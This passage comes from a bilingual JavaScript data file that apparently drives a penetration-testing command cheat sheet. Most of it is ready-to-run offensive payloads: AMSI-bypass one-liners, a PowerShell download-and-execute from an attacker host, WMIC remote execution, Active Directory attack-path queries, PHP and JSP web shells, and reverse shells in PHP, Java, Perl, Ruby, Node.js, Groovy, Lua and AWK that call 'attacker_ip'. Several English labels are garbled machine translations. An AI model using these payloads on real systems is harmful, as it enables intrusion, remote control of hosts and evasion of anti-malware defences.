    references: ['https://github.com/GhostPack/Seatbelt']
  },
  {
    id: 'winpeas',
    name: 'WinPEAS',
    description: { zh: 'Windows权限提升辅助脚本，自动发现提权路径', en: 'Windows privilege escalation helper script with automatic path discovery' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/carlospolop/PEASS-ng/releases', en: 'Download: https://github.com/carlospolop/PEASS-ng/releases' },
    commands: [
      {
        name: { zh: '全量扫描', en: 'Full Scan' },
        command: 'winpeasany.exe',
        description: { zh: '执行所有Windows提权检查', en: 'Run all Windows privilege escalation checks' },
        platform: 'windows'
      },
      {
        name: { zh: '快速模式', en: 'Fast Mode' },
        command: 'winpeasany.exe fast',
        description: { zh: '快速模式(跳过耗时检查)', en: 'Fast mode (skip time-consuming checks)' },
        platform: 'windows'
      },
      {
        name: { zh: '指定检查', en: 'Specify Check' },
        command: 'winpeasany.exe servicesinfo\nwinpeasany.exe userinfo\nwinpeasany.exe systeminfo',
        description: { zh: '仅检查指定类别', en: 'Check a specific category only' },
        platform: 'windows'
      },
      {
        name: { zh: '输出到文件', en: 'Output to File' },
        command: 'winpeasany.exe log=output.txt\nwinpeasany.exe /quiet > output.txt 2>&1',
        description: { zh: '将结果保存到文件', en: 'will ResultSave to File' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/carlospolop/PEASS-ng']
  },
  {
    id: 'linpeas',
    name: 'LinPEAS',
    description: { zh: 'Linux权限提升辅助脚本，自动发现提权路径', en: 'Linux privilege escalation helper script with automatic path discovery' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    commands: [
      {
        name: { zh: '全量扫描', en: 'Full Scan' },
        command: './linpeas.sh',
        description: { zh: '执行所有Linux提权检查', en: 'Run all Linux privilege escalation checks' },
        platform: 'linux'
      },
      {
        name: { zh: '无网络模式', en: 'Offline Mode' },
        command: './linpeas.sh -a -o output.txt',
        description: { zh: '全面扫描(含耗时检查)并输出到文件', en: 'Comprehensive scan (including time-consuming checks) with file output' },
        platform: 'linux'
      },
      {
        name: { zh: '内存加载', en: 'Memory Load' },
        command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash',
        description: { zh: '无文件落地直接执行', en: 'Fileless execution directly in memory' },
        platform: 'linux'
      },
      {
        name: { zh: '指定检查', en: 'Specify Check' },
        command: './linpeas.sh -s\n# -s: 仅超快速检查\n# -P: 仅密码相关\n# -n: 仅网络信息',
        description: { zh: '指定检查类别', en: 'Specify check category' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/carlospolop/PEASS-ng']
  },
  {
    id: 'powershell-amsi',
    name: { zh: 'PowerShell AMSI绕过', en: 'PowerShell AMSI Bypass' },
    description: { zh: 'Windows AMSI(反恶意软件扫描接口)绕过技术集合', en: 'Windows AMSI (Anti-Malware Scan Interface) bypass technique collection' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '基础绕过', en: 'Basic Bypass' },
        command: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
        description: { zh: '通过反射修改amsiInitFailed标志位', en: 'Modify amsiInitFailed flag via reflection' },
        platform: 'windows'
      },
      {
        name: { zh: 'Matt Graeber方式', en: 'Matt Graeber Method' },
        command: '$a=[Ref].Assembly.GetType(\'System.Management.Automation.Am\'+\'siUt\'+\'ils\');$b=$a.GetField(\'am\'+\'siIn\'+\'itFa\'+\'iled\',\'NonPublic,Static\');$b.SetValue($null,$true)',
        description: { zh: '字符串拼接绕过AMSI签名检测', en: 'Bypass AMSI signature detection via string concatenation' },
        platform: 'windows'
      },
      {
        name: { zh: '内存补丁', en: 'Memory Patch' },
        command: '$w=\'System.Management.Automation.A\'+\'msiUtils\';[Runtime.InteropServices.Marshal]::WriteByte(([Ref].Assembly.GetType($w).GetField(\'a\'+\'msiSession\',[Reflection.BindingFlags]\'NonPublic,Static\').GetValue($null)),0x80)',
        description: { zh: '直接修改内存中的AMSI缓冲区', en: 'Directly modify the AMSI buffer in memory' },
        platform: 'windows'
      },
      {
        name: { zh: 'PowerShell降级', en: 'PowerShell Downgrade' },
        command: 'powershell -version 2 -command "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker/script.ps1\')"',
        description: { zh: '使用PowerShell v2(无AMSI)运行脚本', en: 'Run script using PowerShell v2 (no AMSI)' },
        platform: 'windows'
      }
    ],
    references: ['https://amsi.fail']
  },
  {
    id: 'wmic-cmd',
    name: { zh: 'WMIC命令', en: 'WMICCommand' },
    description: { zh: 'Windows Management Instrumentation命令行工具', en: 'Windows Management Instrumentation command-line tool' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '系统信息', en: 'System Info' },
        command: 'wmic os get Caption,Version,BuildNumber,OSArchitecture\nwmic computersystem get Name,Domain,Manufacturer,Model',
        description: { zh: '获取操作系统和计算机信息', en: 'Get OS and computer information' },
        syntaxBreakdown: [
          { part: 'wmic', explanation: { zh: 'WMI命令行工具', en: 'WMICommandlineTools' }, type: 'command' },
          { part: 'os get', explanation: { zh: '查询操作系统对象属性', en: 'QueryOperating System for Objectproperty' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '进程管理', en: 'Process Management' },
        command: 'wmic process list brief\nwmic process where name="cmd.exe" get processid,commandline\nwmic process call create "cmd.exe /c whoami > C:\\temp\\out.txt"',
        description: { zh: '查询和创建进程', en: 'Query and CreateProcess' },
        platform: 'windows'
      },
      {
        name: { zh: '服务管理', en: 'Service Management' },
        command: 'wmic service list brief\nwmic service where "startmode=\'auto\' and state=\'stopped\'" get name,startname',
        description: { zh: '查询服务信息', en: 'Query service information' },
        platform: 'windows'
      },
      {
        name: { zh: '远程执行', en: 'Remote Execution' },
        command: 'wmic /node:target_ip /user:admin /password:pass process call create "cmd.exe /c whoami"',
        description: { zh: '远程WMI命令执行', en: 'RemoteWMICommand Execution' },
        platform: 'windows'
      },
      {
        name: { zh: '已安装软件', en: 'Installed Software' },
        command: 'wmic product get name,version\nwmic qfe list',
        description: { zh: '列出已安装软件和补丁', en: 'ListInstalled Software and Patch' },
        platform: 'windows'
      }
    ],
    references: ['https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic']
  },
  {
    id: 'dsquery',
    name: { zh: 'DSQuery命令', en: 'DSQueryCommand' },
    description: { zh: 'Active Directory查询命令行工具', en: 'Active Directory query command-line tool' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '查询用户', en: 'Query Users' },
        command: 'dsquery user -limit 0\ndsquery user -name *admin*\ndsquery user -inactive 4',
        description: { zh: '查询域用户(所有/管理员/不活跃)', en: 'Query domain users (all/admins/inactive)' },
        syntaxBreakdown: [
          { part: 'dsquery user', explanation: { zh: '查询AD用户对象', en: 'QueryADUsers for Object' }, type: 'command' },
          { part: '-limit 0', explanation: { zh: '不限制返回数量', en: 'not RestrictReturncount' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '查询计算机', en: 'Query Computers' },
        command: 'dsquery computer -limit 0\ndsquery computer -name *server*',
        description: { zh: '查询域内计算机对象', en: 'Query computer objects in the domain' },
        platform: 'windows'
      },
      {
        name: { zh: '查询组', en: 'Query Groups' },
        command: 'dsquery group -name "Domain Admins"\ndsquery group | dsget group -members',
        description: { zh: '查询域组及成员', en: 'Query domain groups and members' },
        platform: 'windows'
      },
      {
        name: { zh: '查询OU', en: 'Query OUs' },
        command: 'dsquery ou\ndsquery * "DC=domain,DC=com" -filter "(objectclass=organizationalUnit)" -attr name',
        description: { zh: '查询组织单位结构', en: 'Query organizational unit structure' },
        platform: 'windows'
      },
      {
        name: { zh: 'LDAP查询', en: 'LDAP Query' },
        command: 'dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr sAMAccountName -limit 0',
        description: { zh: '自定义LDAP过滤器查询特权用户', en: 'Custom LDAP filter to query privileged users' },
        platform: 'windows'
      }
    ],
    references: ['https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)']
  },
  {
    id: 'adexplorer',
    name: 'AD Explorer',
    description: { zh: 'Sysinternals出品的Active Directory浏览器和快照工具', en: 'Sysinternals Active Directory browser and snapshot tool' },
    category: { zh: '系统命令', en: 'System Commands' },
    installation: { zh: '下载: https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer', en: 'Download: https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer' },
    commands: [
      {
        name: { zh: '连接AD', en: 'Connect to AD' },
        command: 'ADExplorer.exe\n# 输入DC地址: dc.domain.com\n# 输入凭证: domain\\user / password\n# 或使用当前域凭证直连',
        description: { zh: '连接到Active Directory进行浏览', en: 'Connect to Active Directory for browsing' },
        platform: 'windows'
      },
      {
        name: { zh: '创建快照', en: 'Create Snapshot' },
        command: 'ADExplorer.exe -snapshot "" output.snp\n# 或在GUI中: File > Create Snapshot',
        description: { zh: '创建AD数据库离线快照(可用BloodHound分析)', en: 'Create an offline AD database snapshot (compatible with BloodHound)' },
        platform: 'windows'
      },
      {
        name: { zh: '比较快照', en: 'Compare Snapshots' },
        command: '# GUI操作: File > Compare\n# 选择两个时间点的快照文件\n# 对比AD变更(新用户/权限变更等)',
        description: { zh: '对比两个快照发现AD变更', en: 'Compare two snapshots to discover AD changes' },
        platform: 'windows'
      }
    ],
    references: ['https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer']
  },
  {
    id: 'ldeep',
    name: 'ldeep',
    description: { zh: 'LDAP深度枚举工具，用于从Linux远程查询AD信息', en: 'LDAP deep enumeration tool for remote AD queries from Linux' },
    category: { zh: '系统命令', en: 'System Commands' },
    installation: 'pip3 install ldeep',
    commands: [
      {
        name: { zh: '用户枚举', en: 'User Enumeration' },
        command: 'ldeep ldap -u user -p password -d domain.com -s dc_ip users\nldeep ldap -u user -p password -d domain.com -s dc_ip users -v',
        description: { zh: '枚举域用户', en: 'Enumerate domain users' },
        syntaxBreakdown: [
          { part: 'ldap', explanation: { zh: '使用LDAP协议连接', en: 'UseLDAPProtocolConnection' }, type: 'parameter' },
          { part: '-s', explanation: { zh: 'LDAP服务器地址', en: 'LDAP ServerAddress' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '组和GPO', en: 'Groups and GPOs' },
        command: 'ldeep ldap -u user -p pass -d domain.com -s dc_ip groups\nldeep ldap -u user -p pass -d domain.com -s dc_ip gpo',
        description: { zh: '枚举组和组策略对象', en: 'EnumerationGroups and Group Policy for Object' },
        platform: 'all'
      },
      {
        name: { zh: '委派查询', en: 'Delegation Query' },
        command: 'ldeep ldap -u user -p pass -d domain.com -s dc_ip delegations\nldeep ldap -u user -p pass -d domain.com -s dc_ip trusts',
        description: { zh: '查询委派配置和域信任关系', en: 'Query delegation configuration and domain trust relationships' },
        platform: 'all'
      },
      {
        name: { zh: '密码策略', en: 'Password Policy' },
        command: 'ldeep ldap -u user -p pass -d domain.com -s dc_ip pso\nldeep ldap -u user -p pass -d domain.com -s dc_ip pass-pols',
        description: { zh: '查询密码策略', en: 'QueryPassword Policy' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/franc-pentest/ldeep']
  },
  {
    id: 'bloodhound-cypher',
    name: 'BloodHound Cypher',
    description: { zh: 'BloodHound Neo4j Cypher查询语句集合', en: 'BloodHound Neo4j Cypher query collection' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '查找域管路径', en: 'Find Domain Admin Path' },
        command: 'MATCH p=shortestPath((n:User {name:"USER@DOMAIN.COM"})-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p',
        description: { zh: '查找指定用户到域管的最短攻击路径', en: 'Find the shortest attack path from a specified user to Domain Admin' },
        platform: 'all'
      },
      {
        name: { zh: 'Kerberoastable用户', en: 'Kerberoastable Users' },
        command: 'MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u.name, u.serviceprincipalnames',
        description: { zh: '查找可进行Kerberoasting的用户', en: 'Find users susceptible to Kerberoasting' },
        platform: 'all'
      },
      {
        name: { zh: '不需要预认证', en: 'No Pre-auth Required' },
        command: 'MATCH (u:User {dontreqpreauth:true}) RETURN u.name',
        description: { zh: '查找可进行AS-REP Roasting的用户', en: 'Find users susceptible to AS-REP Roasting' },
        platform: 'all'
      },
      {
        name: { zh: '本地管理员', en: 'Local Admins' },
        command: 'MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name',
        description: { zh: '查找所有具有本地管理员权限的用户', en: 'FindallhasLocal AdminsPermission Users' },
        platform: 'all'
      },
      {
        name: { zh: '无约束委派', en: 'Unconstrained Delegation' },
        command: 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name',
        description: { zh: '查找配置了无约束委派的计算机', en: 'FindConfiguration Unconstrained Delegation Computers' },
        platform: 'all'
      },
      {
        name: { zh: 'ACL滥用', en: 'ACL Abuse' },
        command: 'MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(target) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN p',
        description: { zh: '查找可利用的ACL权限关系', en: 'Find exploitable ACL permission relationships' },
        platform: 'all'
      }
    ],
    references: ['https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/']
  },
  {
    id: 'php-reverse',
    name: { zh: 'PHP反弹Shell', en: 'PHP Reverse Shell' },
    description: { zh: 'PHP语言反弹Shell命令集合', en: 'PHP reverse shell command collection' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: 'exec方式', en: 'exec Method' },
        command: 'php -r \'$sock=fsockopen("attacker_ip",4444);exec("sh <&3 >&3 2>&3");\'',
        description: { zh: '使用exec函数反弹Shell', en: 'Reverse shell using exec function' },
        syntaxBreakdown: [
          { part: 'fsockopen', explanation: { zh: '创建TCP连接', en: 'CreateTCPConnection' }, type: 'command' },
          { part: 'exec', explanation: { zh: '执行系统命令', en: 'ExecuteSystem Commands' }, type: 'command' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'proc_open方式', en: 'proc_open Method' },
        command: 'php -r \'$sock=fsockopen("attacker_ip",4444);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
        description: { zh: '使用proc_open创建交互式Shell', en: 'Create an interactive shell using proc_open' },
        platform: 'linux'
      },
      {
        name: { zh: 'Web Shell一句话', en: 'Web Shell One-Liner' },
        command: '<?php system($_GET["cmd"]); ?>\n<?php echo shell_exec($_REQUEST["cmd"]); ?>\n<?php eval($_POST["cmd"]); ?>',
        description: { zh: '常用PHP一句话木马(仅用于安全测试)', en: 'Common PHP web shell one-liner (for security testing only)' },
        platform: 'all'
      },
      {
        name: { zh: 'PentestMonkey版', en: 'PentestMonkey Version' },
        command: '# 下载完整PHP反弹Shell:\n# https://github.com/pentestmonkey/php-reverse-shell\n# 修改$ip和$port后上传执行',
        description: { zh: '功能完整的PHP反弹Shell脚本', en: 'Functioncomplete PHP Reverse ShellScript' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/pentestmonkey/php-reverse-shell']
  },
  {
    id: 'java-reverse',
    name: { zh: 'Java反弹Shell', en: 'Java Reverse Shell' },
    description: { zh: 'Java语言反弹Shell命令集合', en: 'Java reverse shell command collection' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: 'Runtime方式', en: 'Runtime Method' },
        command: 'Runtime rt = Runtime.getRuntime();\nString[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"};\nrt.exec(cmd);',
        description: { zh: 'Java Runtime执行反弹Shell', en: 'Java Runtime reverse shell' },
        platform: 'linux'
      },
      {
        name: { zh: 'Base64编码版', en: 'Base64 Encoded Version' },
        command: 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}',
        description: { zh: '用于Payload注入时避免特殊字符问题', en: 'Avoids special character issues during payload injection' },
        syntaxBreakdown: [
          { part: '{echo,BASE64}', explanation: { zh: '输出Base64编码的命令', en: 'OutputBase64-encoded command' }, type: 'command' },
          { part: '{base64,-d}', explanation: { zh: '解码Base64', en: 'DecodingBase64' }, type: 'command' },
          { part: '{bash,-i}', explanation: { zh: '执行解码后的命令', en: 'Execute decoded command' }, type: 'command' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'JSP反弹Shell', en: 'JSP Reverse Shell' },
        command: '<%@page import="java.util.*,java.io.*"%>\n<%\nProcess p=Runtime.getRuntime().exec("bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}");\n%>',
        description: { zh: 'JSP Web Shell方式', en: 'JSP Web ShellMethod' },
        platform: 'linux'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'perl-reverse',
    name: { zh: 'Perl反弹Shell', en: 'Perl Reverse Shell' },
    description: { zh: 'Perl语言反弹Shell命令', en: 'Perl reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'perl -e \'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\'',
        description: { zh: 'Perl标准反弹Shell', en: 'Standard Perl reverse shell' },
        platform: 'all'
      },
      {
        name: { zh: 'Perl无fork', en: 'Perl No-fork' },
        command: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
        description: { zh: 'Perl IO模块方式', en: 'Perl IOModuleMethod' },
        platform: 'linux'
      },
      { name: { zh: 'Perl 一行命令', en: 'Perl one-liner' }, command: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'', description: { zh: 'Perl IO socket 反弹 Shell', en: 'Perl IO socket reverse shell' }, platform: 'linux' },
      { name: { zh: 'Windows Perl', en: 'Windows Perl reverse' }, command: 'perl -e \'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("cmd.exe");\'', description: { zh: 'Windows Perl 反弹 cmd', en: 'Perl reverse shell on Windows' }, platform: 'windows' },
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'ruby-reverse',
    name: { zh: 'Ruby反弹Shell', en: 'Ruby Reverse Shell' },
    description: { zh: 'Ruby语言反弹Shell命令', en: 'Ruby reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'ruby -rsocket -e\'f=TCPSocket.open("attacker_ip",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        description: { zh: 'Ruby标准反弹Shell', en: 'Standard Ruby reverse shell' },
        syntaxBreakdown: [
          { part: '-rsocket', explanation: { zh: '加载Socket库', en: 'LoadSocketdatabase' }, type: 'parameter' },
          { part: 'TCPSocket.open', explanation: { zh: '创建TCP连接', en: 'CreateTCPConnection' }, type: 'command' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'Windows版', en: 'Windows Version' },
        command: 'ruby -rsocket -e \'c=TCPSocket.new("attacker_ip",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
        description: { zh: 'Windows兼容版本', en: 'Windows-compatible version' },
        platform: 'windows'
      },
      { name: { zh: 'Ruby 短版本', en: 'Ruby short version' }, command: "ruby -rsocket -e 'c=TCPSocket.new(\"attacker_ip\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", description: { zh: 'Ruby 短版本反弹 Shell', en: 'Compact Ruby reverse shell' }, platform: 'linux' },
      { name: { zh: 'Ruby 完整版', en: 'Ruby full version' }, command: "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker_ip\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", description: { zh: 'Ruby 完整反弹 Shell（fork 后台）', en: 'Full Ruby reverse shell with fork' }, platform: 'linux' },
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'nodejs-reverse',
    name: { zh: 'Node.js反弹Shell', en: 'Node.js Reverse Shell' },
    description: { zh: 'Node.js语言反弹Shell命令', en: 'Node.js reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'node -e \'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("sh",[]);var client=new net.Socket();client.connect(4444,"attacker_ip",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'',
        description: { zh: 'Node.js标准反弹Shell', en: 'Standard Node.js reverse shell' },
        syntaxBreakdown: [
          { part: 'net.Socket()', explanation: { zh: '创建TCP Socket连接', en: 'CreateTCP SocketConnection' }, type: 'command' },
          { part: 'child_process.spawn', explanation: { zh: '创建子进程执行Shell', en: 'Spawn subprocess to execute shell' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'require方式', en: 'require Method' },
        command: 'require("child_process").exec("bash -c \'bash -i >& /dev/tcp/attacker_ip/4444 0>&1\'")',
        description: { zh: '简短版本(适用于eval注入)', en: 'Short version (suitable for eval injection)' },
        platform: 'linux'
      },
      { name: { zh: 'Node.js child_process', en: 'Node.js child_process' }, command: "node -e \"require('child_process').exec('bash -i >& /dev/tcp/attacker_ip/4444 0>&1')\"", description: { zh: 'Node.js exec 执行反弹 Shell', en: 'Node.js exec reverse shell' }, platform: 'linux' },
      { name: { zh: 'Node.js 网络 Socket', en: 'Node.js net socket' }, command: "node -e \"var n=require('net'),s=require('child_process').spawn('/bin/sh',[]);var c=n.connect(4444,'attacker_ip');c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c)\"", description: { zh: 'Node.js net socket 反弹 Shell', en: 'Node.js net socket reverse shell' }, platform: 'linux' },
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'groovy-reverse',
    name: { zh: 'Groovy反弹Shell', en: 'Groovy Reverse Shell' },
    description: { zh: 'Groovy语言反弹Shell(常用于Jenkins)', en: 'Groovy reverse shell (commonly used in Jenkins)' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'String host="attacker_ip";\nint port=4444;\nString cmd="/bin/bash";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};\np.destroy();s.close();',
        description: { zh: 'Groovy完整反弹Shell(用于Jenkins Script Console)', en: 'GroovycompleteReverse Shell( used for Jenkins Script Console)' },
        platform: 'all'
      },
      {
        name: { zh: '简短版', en: 'Short Version' },
        command: '"bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}".execute()',
        description: { zh: '简短版(Base64编码命令)', en: 'Short Version(Base64 EncodingCommand)' },
        platform: 'linux'
      },
      { name: { zh: 'Groovy exec', en: 'Groovy exec' }, command: 'String host="attacker_ip";\nint port=4444;\nString cmd="sh";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush();Thread.sleep(50); try{p.exitValue();break;}catch(e){} }', description: { zh: 'Groovy 完整反弹 Shell', en: 'Full Groovy reverse shell' }, platform: 'linux' },
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'lua-reverse',
    name: { zh: 'Lua反弹Shell', en: 'Lua Reverse Shell' },
    description: { zh: 'Lua语言反弹Shell命令', en: 'Lua reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'attacker_ip\',\'4444\');os.execute(\'sh -i <&3 >&3 2>&3\');"',
        description: { zh: 'Lua Socket库反弹Shell', en: 'Lua SocketdatabaseReverse Shell' },
        platform: 'linux'
      },
      {
        name: { zh: 'Lua5.1版', en: 'Lua 5.1 Version' },
        command: 'lua5.1 -e \'local host, port = "attacker_ip", 4444 local socket = require("socket") local tcp = socket.tcp() tcp:connect(host, port) while true do local cmd, status = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\'',
        description: { zh: 'Lua 5.1兼容版本', en: 'Lua 5.1 compatible version' },
        platform: 'linux'
      },
      { name: { zh: 'Lua socket 反弹', en: 'Lua socket reverse' }, command: "lua5.1 -e 'local host, port = \"attacker_ip\", 4444; local socket = require(\"socket\"); local tcp = socket.tcp(); tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive(); local f = io.popen(cmd, \"r\"); local s = f:read(\"*a\"); f:close(); tcp:send(s); if status == \"closed\" then break end end; tcp:close()'", description: { zh: 'Lua luasocket 反弹 Shell', en: 'Lua luasocket reverse shell' }, platform: 'linux' },
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'awk-reverse',
    name: { zh: 'AWK反弹Shell', en: 'AWK Reverse Shell' },
    description: { zh: 'AWK语言反弹Shell命令', en: 'AWK reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'awk \'BEGIN {s = "/inet/tcp/0/attacker_ip/4444"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
        description: { zh: 'AWK网络功能反弹Shell', en: 'Reverse shell using AWK network functions' },
        syntaxBreakdown: [
          { part: '/inet/tcp/0/', explanation: { zh: 'AWK内置TCP连接', en: 'AWK built-in TCP connection' }, type: 'command' },
          { part: 'attacker_ip/4444', explanation: { zh: '目标地址和端口', en: 'TargetAddress and Port' }, type: 'value' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'GAWK版', en: 'GAWK Version' },
        command: 'gawk \'BEGIN{s="/inet/tcp/0/attacker_ip/4444";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}\'',
        description: { zh: 'GNU AWK简化版', en: 'Simplified GNU AWK version' },
        platform: 'linux'
      },
      { name: { zh: 'AWK UDP 反弹', en: 'AWK UDP reverse' }, command: "awk 'BEGIN{s=\"/inet/udp/0/attacker_ip/4444\";while(1){do{printf \"shell>\" |& s;s |& getline c;if(c){while ((c |& getline) > 0)print |& s;close(c)}}while(c!=\"exit\")close(s)}}'", description: { zh: 'AWK UDP 反弹 Shell', en: 'AWK UDP reverse shell' }, platform: 'linux' },
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'base64-encode',
    name: { zh: 'Base64编码', en: 'Base64 Encoding' },
    description: { zh: 'Base64编码/解码命令集合', en: 'Base64 encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Linux:\necho -n "payload" | base64\nbase64 file.txt > encoded.txt\n\n# Windows PowerShell:\n[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("payload"))\n\n# Python:\npython3 -c "import base64; print(base64.b64encode(b\'payload\').decode())"',
        description: { zh: '各平台Base64编码方法', en: 'Base64 encoding methods by platform' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Linux:\necho "cGF5bG9hZA==" | base64 -d\nbase64 -d encoded.txt > decoded.txt\n\n# Windows PowerShell:\n[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cGF5bG9hZA=="))\n\n# Python:\npython3 -c "import base64; print(base64.b64decode(\'cGF5bG9hZA==\').decode())"',
        description: { zh: '各平台Base64解码方法', en: 'Base64 decoding methods by platform' },
        platform: 'all'
      },
      {
        name: { zh: 'URL安全Base64', en: 'URL-Safe Base64' },
        command: '# Python:\nimport base64\nbase64.urlsafe_b64encode(b"payload").decode()\nbase64.urlsafe_b64decode("cGF5bG9hZA==").decode()',
        description: { zh: 'URL安全的Base64编码(+/替换为-_)', en: 'URLSecurity Base64 Encoding(+/Replace is -_)' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'url-encode',
